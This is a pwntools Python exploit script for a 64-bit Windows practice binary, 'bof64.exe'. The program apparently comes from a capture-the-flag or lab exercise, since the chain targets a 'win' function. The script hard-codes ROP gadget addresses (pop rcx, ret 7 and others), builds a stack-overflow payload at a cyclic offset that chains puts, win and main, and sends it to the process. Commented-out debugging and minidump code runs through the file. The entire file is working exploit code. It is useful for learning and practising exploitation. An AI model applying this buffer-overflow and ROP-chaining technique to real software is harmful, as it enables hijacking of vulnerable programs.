from pwn import *

context(os = 'windows', arch = 'amd64')

exe = PE("bof64.exe")

windbgscript = """
bp 0x1400072EC
g
"""

if args.GDB:
    io = exe.debug(windbgscript=windbgscript)
else:
    io = exe.process()
# minidump_path = windbg.minidump_on_crash(io)

# # minidump = io.minidump()
# # print(minidump)
# # if args.GDB:
# #     windbg.attach(io, windbgscript='g')
# for sym, addr in exe.symbols.items():
#     print(sym, hex(addr))

# io.sendline(cyclic(0x40))
# io.wait()
# io.close()

# print(minidump_path)
# from minidump.minidumpfile import MinidumpFile
# minidump =  MinidumpFile.parse(minidump_path)
# print(minidump.threads.threads[0].ContextObject)

pop_rdi = 0x140007575 # 0x0000000140007575 : pop rdi ; ret
pop_rsi = 0x140009c3b # 0x0000000140009c3b : pop rsi ; ret
pop_rcx = 0x140002163 # 0x0000000140002163 : pop rcx ; ret 1
pop_rbp = 0x140007c3d # 0x0000000140007c3d : pop rbp ; ret
pop_rax = 0x14003634c # 0x000000014003634c : pop rax ; ret
ret_7 = 0x14001d95b # 0x000000014001d95b : ret 7
ret = 0x140001209 # 0x0000000140001209 : ret

# ROP.clear_cache()
# rop = ROP(exe)
# rop.puts(exe.imports.ReadConsoleW)
# rop.win()

# print(rop.dump())
# print(rop.search(move=7))
# for name, addr in exe.imports.items():
#     print(name, hex(addr))

# io = exe.process()

print(f"{exe.address=:#x}")

win = exe.search(b"You win!\n", writable=True)
print(f'{win=:#x}')
print(hexdump(io.readmem(win, 0x100)))
print(hexdump(io.readmem(exe.sym.win, 0x100)))

print(exe.disasm(exe.sym.win, 0x100))

kernel32_addr = 0x14009a902 # module_handles_0

payload = flat({'kaaa': [
    pop_rcx,
    kernel32_addr,
    ret_7,
    b'A', # for the ret 1 rcx gadget
    ret,
    b'B'*7, # for the ret 7 gadget
    exe.sym.puts,#0x140002211
    exe.sym.win,#0x1400031D4
    exe.sym.main,# 0x1400072C0
]})

print(hexdump(payload))

# payload = flat({
#     'kaaa': rop.chain()
# })
io.sendline(payload)

io.interactive()
